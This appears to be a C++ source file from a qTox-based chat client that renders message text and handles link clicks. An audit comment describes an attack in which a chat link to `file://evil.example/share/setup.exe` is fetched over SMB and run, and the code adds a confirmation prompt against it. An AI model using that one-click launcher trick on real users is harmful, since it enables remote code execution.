/*
    Copyright © 2014-2019 by The qTox Project Contributors

    This file is part of qTox, a Qt-based graphical interface for Tox.

    qTox is libre software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    qTox is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with qTox.  If not, see <http://www.gnu.org/licenses/>.
*/

#include "text.h"
#include "../documentcache.h"
#include "src/model/air/airmention.h"
#include "src/widget/air/airoverlay.h"
#include "src/widget/air/airstrings.h"

#include <QAbstractTextDocumentLayout>
#include <QApplication>
#include <QDebug>
#include <QDesktopServices>
#include <QFontMetrics>
#include <QGraphicsSceneMouseEvent>
#include <QPainter>
#include <QPalette>
#include <QStyle>
#include <QTextBlock>
#include <QTextFragment>
#include <QTextLayout>
#include <QUrl>

namespace {
/** Whether the words hold a letter written left to right or right to left. */
bool hasStrongLetter(const QString& words)
{
    for (int i = 0; i < words.size(); ++i) {
        uint code = words.at(i).unicode();
        if (words.at(i).isHighSurrogate() && i + 1 < words.size() && words.at(i + 1).isLowSurrogate()) {
            code = QChar::surrogateToUcs4(words.at(i), words.at(i + 1));
            ++i;
        }
        switch (QChar::direction(code)) {
        case QChar::DirL:
        case QChar::DirR:
        case QChar::DirAL:
            return true;
        default:
            break;
        }
    }
    return false;
}
} // namespace

Text::Text(DocumentCache& documentCache_, Settings& settings_, Style& style_,
    const QColor& custom, const QString& txt, const QFont& font, bool enableElide,
    const QString& rawText_, const TextType& type)
    : rawText(rawText_)
    , elide(enableElide)
    , defFont(font)
    , textType(type)
    , customColor(custom)
    , documentCache(documentCache_)
    , settings{settings_}
    , defStyleSheet(style_.getStylesheet(QStringLiteral("chatArea/innerStyle.css"), settings_, font))
    , style{style_}
{
    color = textColor();
    setText(txt);
    setAcceptedMouseButtons(Qt::LeftButton);
    setAcceptHoverEvents(true);
}

Text::Text(DocumentCache& documentCache_, Settings& settings_, Style& style_,
    const QString& txt, const QFont& font, bool enableElide, const QString& rawText_,
    const TextType& type)
    : Text(documentCache_, settings_, style_, style_.getColor(Style::ColorPalette::MainText),
        txt, font, enableElide, rawText_, type)
{
}

Text::~Text()
{
    if (doc)
        documentCache.push(doc);
}

void Text::setText(const QString& txt)
{
    text = txt;
    dirty = true;
}

void Text::selectText(const QString& txt, const std::pair<int, int>& point)
{
    regenerate();

    if (!doc) {
        return;
    }

    auto cursor = doc->find(txt, point.first);

    selectText(cursor, point);
}

void Text::selectText(const QRegularExpression &exp, const std::pair<int, int>& point)
{
    regenerate();

    if (!doc) {
        return;
    }

    auto cursor = doc->find(exp, point.first);

    selectText(cursor, point);
}

void Text::deselectText()
{
    dirty = true;
    regenerate();
    update();
}

void Text::setWidth(float w)
{
    width = static_cast<qreal>(w);
    dirty = true;

    regenerate();
}

void Text::setDocumentMargin(qreal margin)
{
    documentMargin = margin;
    // As with setText(), the document takes it in when the line is laid out.
    dirty = true;
}

void Text::setStartAligned(bool startAligned_)
{
    startAligned = startAligned_;
    dirty = true;
}

void Text::setOwnDirection(bool ownDirection_)
{
    ownDirection = ownDirection_;
    dirty = true;
}

void Text::selectionMouseMove(QPointF scenePos)
{
    if (!doc)
        return;

    int cur = cursorFromPos(scenePos);
    if (cur >= 0) {
        selectionEnd = cur;
        selectedText = extractSanitizedText(getSelectionStart(), getSelectionEnd());
    }

    update();
}

void Text::selectionStarted(QPointF scenePos)
{
    int cur = cursorFromPos(scenePos);
    if (cur >= 0) {
        selectionEnd = cur;
        selectionAnchor = cur;
    }
}

void Text::selectionCleared()
{
    selectedText.clear();
    selectedText.squeeze();

    // Do not reset selectionAnchor!
    selectionEnd = -1;

    update();
}

void Text::selectionDoubleClick(QPointF scenePos)
{
    if (!doc)
        return;

    int cur = cursorFromPos(scenePos);

    if (cur >= 0) {
        QTextCursor cursor(doc);
        cursor.setPosition(cur);
        cursor.select(QTextCursor::WordUnderCursor);

        selectionAnchor = cursor.selectionStart();
        selectionEnd = cursor.selectionEnd();

        selectedText = extractSanitizedText(getSelectionStart(), getSelectionEnd());
    }

    update();
}

void Text::selectionTripleClick(QPointF scenePos)
{
    if (!doc)
        return;

    int cur = cursorFromPos(scenePos);

    if (cur >= 0) {
        QTextCursor cursor(doc);
        cursor.setPosition(cur);
        cursor.select(QTextCursor::BlockUnderCursor);

        selectionAnchor = cursor.selectionStart();
        selectionEnd = cursor.selectionEnd();

        if (cursor.block().isValid() && cursor.block().blockNumber() != 0)
            selectionAnchor++;

        selectedText = extractSanitizedText(getSelectionStart(), getSelectionEnd());
    }

    update();
}

void Text::selectionFocusChanged(bool focusIn)
{
    selectionHasFocus = focusIn;
    update();
}

bool Text::isOverSelection(QPointF scenePos) const
{
    int cur = cursorFromPos(scenePos);
    if (getSelectionStart() < cur && getSelectionEnd() >= cur)
        return true;

    return false;
}

QString Text::getSelectedText() const
{
    return selectedText;
}

void Text::fontChanged(const QFont& font)
{
    defFont = font;
}

QRectF Text::boundingRect() const
{
    return QRectF(QPointF(0, 0), size);
}

void Text::paint(QPainter* painter, const QStyleOptionGraphicsItem* option, QWidget* widget)
{
    std::ignore = option;
    std::ignore = widget;

    if (!doc)
        return;

    painter->setClipRect(boundingRect());

    // draw selection
    QAbstractTextDocumentLayout::PaintContext ctx;
    QAbstractTextDocumentLayout::Selection sel;

    if (hasSelection()) {
        sel.cursor = QTextCursor(doc);
        sel.cursor.setPosition(getSelectionStart());
        sel.cursor.setPosition(getSelectionEnd(), QTextCursor::KeepAnchor);
    }

    const QColor selectionColor = style.getColor(Style::ColorPalette::SelectText);
    sel.format.setBackground(selectionColor.lighter(selectionHasFocus ? 100 : 160));
    sel.format.setForeground(selectionHasFocus ? Qt::white : Qt::black);

    ctx.selections.append(sel);
    ctx.palette.setColor(QPalette::Text, color);

    // draw text
    doc->documentLayout()->draw(painter, ctx);
}

void Text::visibilityChanged(bool visible)
{
    keepInMemory = visible;

    regenerate();
    update();
}

void Text::reloadTheme()
{
    defStyleSheet = style.getStylesheet(QStringLiteral("chatArea/innerStyle.css"), settings, defFont);
    color = textColor();
    dirty = true;
    regenerate();
    update();
}

qreal Text::getAscent() const
{
    return ascent;
}

bool Text::lastTextLine(QRectF* box, qreal* baseline) const
{
    // Every laid-out line has a height, an empty one too: a null box is a text not laid out yet.
    if (lastLineBox.isNull()) {
        return false;
    }
    *box = lastLineBox;
    *baseline = lastLineBaseline;
    return true;
}

void Text::mousePressEvent(QGraphicsSceneMouseEvent* event)
{
    if (event->button() == Qt::LeftButton)
        event->accept(); // grabber
}

void Text::mouseReleaseEvent(QGraphicsSceneMouseEvent* event)
{
    if (!doc)
        return;

    QString anchor = doc->documentLayout()->anchorAt(event->pos());

    if (anchor.isEmpty())
        return;

    // KHANDAQ (audit 2026-08-20): a chat message is attacker-controlled text, and the formatter
    // linkifies file:// and smb:// (textformatter.cpp), so a contact or any member of a group could
    // put a one-click launcher in the chat log. `file://evil.example/share/setup.exe` becomes the
    // UNC path //evil.example/share/setup.exe, which ShellExecute happily fetches over SMB/WebDAV
    // and runs — no prior file transfer needed, and nothing here asked the user anything. Files
    // written by Khandaq get no Mark-of-the-Web either, so the OS raises no warning of its own.
    //
    // The product already treats exactly this action as needing consent everywhere else: opening a
    // received file through the transfer widget goes through MessageBoxManager::confirmExecutableOpen,
    // and Android shows a URL confirmation dialog for every link tapped in a message. This is the
    // one path that did not ask. It asks now, and it shows the full target, because the whole risk
    // is that the target is not what the sentence around it implies.
    const QUrl url(anchor);
    const QString scheme = url.scheme().toLower();
    // KHANDAQ (26.11.2026): a mention opens the member, which the transcript does (ChatWidget).
    if (!Air::mentionLinkKey(anchor).isEmpty()) {
        return;
    }
    if (scheme == QStringLiteral("file") || scheme == QStringLiteral("smb")) {
        // Asked over the window the transcript is in (E21), Cancel first, as a dangerous verb is.
        QWidget* const view = event->widget();
        if (!view) {
            return;
        }
        // This class is Text too: the strings go by their full name.
        AirDialog::confirm(view, AirStrings::text(AirStrings::Text::LinkLocalTitle),
                           AirStrings::text(AirStrings::Text::LinkLocalMessage).arg(url.toString()),
                           AirStrings::text(AirStrings::Text::LinkOpen), AirDialog::Verb::Danger,
                           [url] { QDesktopServices::openUrl(url); });
        return;
    }

    // open anchor in browser
    QDesktopServices::openUrl(url);
}

void Text::hoverMoveEvent(QGraphicsSceneHoverEvent* event)
{
    if (!doc)
        return;

    QString anchor = doc->documentLayout()->anchorAt(event->pos());

    if (anchor.isEmpty())
        setCursor(Qt::IBeamCursor);
    else
        setCursor(Qt::PointingHandCursor);

    // tooltip
    setToolTip(extractImgTooltip(cursorFromPos(event->scenePos(), false)));
}

QString Text::getText() const
{
    return rawText;
}

/**
 * @brief Extracts the target of a link from the text at a given coordinate
 * @param scenePos Position in scene coordinates
 * @return The link target URL, or an empty string if there is no link there
 */
QString Text::anchorAt(QPointF scenePos) const
{
    return doc ? doc->documentLayout()->anchorAt(mapFromScene(scenePos)) : QString();
}

QString Text::getLinkAt(QPointF scenePos) const
{
    QTextCursor cursor(doc);
    cursor.setPosition(cursorFromPos(scenePos));
    return cursor.charFormat().anchorHref();
}

void Text::regenerate()
{
    if (!doc) {
        doc = documentCache.pop();
        dirty = true;
    }

    if (dirty) {
        // The documents are shared through the cache: each text sets its own margin.
        doc->setDocumentMargin(documentMargin);
        doc->setDefaultFont(defFont);

        if (elide) {
            QFontMetrics metrics = QFontMetrics(defFont);
            QString elidedText = metrics.elidedText(text, Qt::ElideRight, qRound(width));

            doc->setPlainText(elidedText);
        } else {
            doc->setDefaultStyleSheet(defStyleSheet);
            doc->setHtml(text);
        }

        // KHANDAQ (owner, 28.11.2026): Qt sets a paragraph without a letter of either direction
        // (figures, emoji) from left to right; such a paragraph takes the interface's direction,
        // as on the phones, so "15:30" or a smiley stands at the right in Arabic.
        if (ownDirection && !startAligned && QGuiApplication::layoutDirection() == Qt::RightToLeft) {
            for (QTextBlock block = doc->begin(); block.isValid(); block = block.next()) {
                if (!hasStrongLetter(block.text())) {
                    QTextBlockFormat format = block.blockFormat();
                    format.setLayoutDirection(Qt::RightToLeft);
                    QTextCursor(block).setBlockFormat(format);
                }
            }
        }

        // wrap mode
        QTextOption opt;
        opt.setWrapMode(elide ? QTextOption::NoWrap : QTextOption::WrapAtWordBoundaryOrAnywhere);
        if (startAligned) {
            // Absolute, so a paragraph in the other script does not turn it around; the direction
            // is read here, so a change of language comes in with the next regeneration.
            opt.setAlignment(QStyle::visualAlignment(QGuiApplication::layoutDirection(), Qt::AlignLeft));
        }
        doc->setDefaultTextOption(opt);

        // width
        doc->setTextWidth(width);
        doc->documentLayout()->update();

        // update ascent
        if (doc->firstBlock().layout()->lineCount() > 0)
            ascent = doc->firstBlock().layout()->lineAt(0).ascent();

        // let the scene know about our change in size
        if (size != idealSize())
            prepareGeometryChange();

        // get the new width and height
        size = idealSize();

        // KHANDAQ (owner, 28.11.2026): where the last line ends and where its baseline lies, read
        // once the whole document is laid out (size above), for the time of the entry.
        lastLineBox = QRectF();
        lastLineBaseline = 0.0;
        for (QTextBlock block = doc->lastBlock(); block.isValid(); block = block.previous()) {
            const QTextLayout* const blockLayout = block.layout();
            if (!blockLayout || blockLayout->lineCount() == 0) {
                continue;
            }
            const QTextLine line = blockLayout->lineAt(blockLayout->lineCount() - 1);
            const QPointF origin = blockLayout->position();
            lastLineBox = line.naturalTextRect().translated(origin);
            lastLineBaseline = origin.y() + line.y() + line.ascent();
            break;
        }

        dirty = false;
    }

    // if we are not visible -> free mem
    if (!keepInMemory)
        freeResources();
}

void Text::freeResources()
{
    documentCache.push(doc);
    doc = nullptr;
}

QSizeF Text::idealSize()
{
    if (doc)
        return doc->size();

    return size;
}

int Text::cursorFromPos(QPointF scenePos, bool fuzzy) const
{
    if (doc)
        return doc->documentLayout()->hitTest(mapFromScene(scenePos),
                                              fuzzy ? Qt::FuzzyHit : Qt::ExactHit);

    return -1;
}

int Text::getSelectionEnd() const
{
    return qMax(selectionAnchor, selectionEnd);
}

int Text::getSelectionStart() const
{
    return qMin(selectionAnchor, selectionEnd);
}

bool Text::hasSelection() const
{
    return selectionEnd >= 0;
}

QString Text::extractSanitizedText(int from, int to) const
{
    if (!doc)
        return "";

    QString txt;

    QTextBlock begin = doc->findBlock(from);
    QTextBlock end = doc->findBlock(to);
    for (QTextBlock block = begin; block != end.next() && block.isValid(); block = block.next()) {
        for (QTextBlock::Iterator itr = block.begin(); itr != block.end(); ++itr) {
            int pos = itr.fragment().position(); // fragment position -> position of the first
                                                 // character in the fragment

            if (itr.fragment().charFormat().isImageFormat()) {
                QTextImageFormat imgFmt = itr.fragment().charFormat().toImageFormat();
                QString key = imgFmt.name(); // img key (eg. key::D for :D)
                QString rune = key.mid(4);

                if (pos >= from && pos < to) {
                    txt += rune;
                    ++pos;
                }
            } else {
                for (QChar c : itr.fragment().text()) {
                    if (pos >= from && pos < to)
                        txt += c;

                    ++pos;
                }
            }
        }

        txt += '\n';
    }

    txt.chop(1);

    return txt;
}

QString Text::extractImgTooltip(int pos) const
{
    for (QTextBlock::Iterator itr = doc->firstBlock().begin(); itr != doc->firstBlock().end(); ++itr) {
        if (itr.fragment().contains(pos) && itr.fragment().charFormat().isImageFormat()) {
            QTextImageFormat imgFmt = itr.fragment().charFormat().toImageFormat();
            return imgFmt.toolTip();
        }
    }

    return QString();
}

void Text::selectText(QTextCursor& cursor, const std::pair<int, int>& point)
{
    if (!cursor.isNull()) {
        cursor.beginEditBlock();
        cursor.setPosition(point.first);
        cursor.setPosition(point.first + point.second, QTextCursor::KeepAnchor);
        cursor.endEditBlock();

        QTextCharFormat format;
        format.setBackground(QBrush(style.getColor(Style::ColorPalette::SearchHighlighted)));
        cursor.mergeCharFormat(format);

        regenerate();
        update();
    }
}

QColor Text::textColor() const
{
    QColor c = style.getColor(Style::ColorPalette::MainText);
    if (textType == ACTION) {
        c = style.getColor(Style::ColorPalette::Action);
    } else if (textType == CUSTOM) {
        c = customColor;
    }

    return c;
}
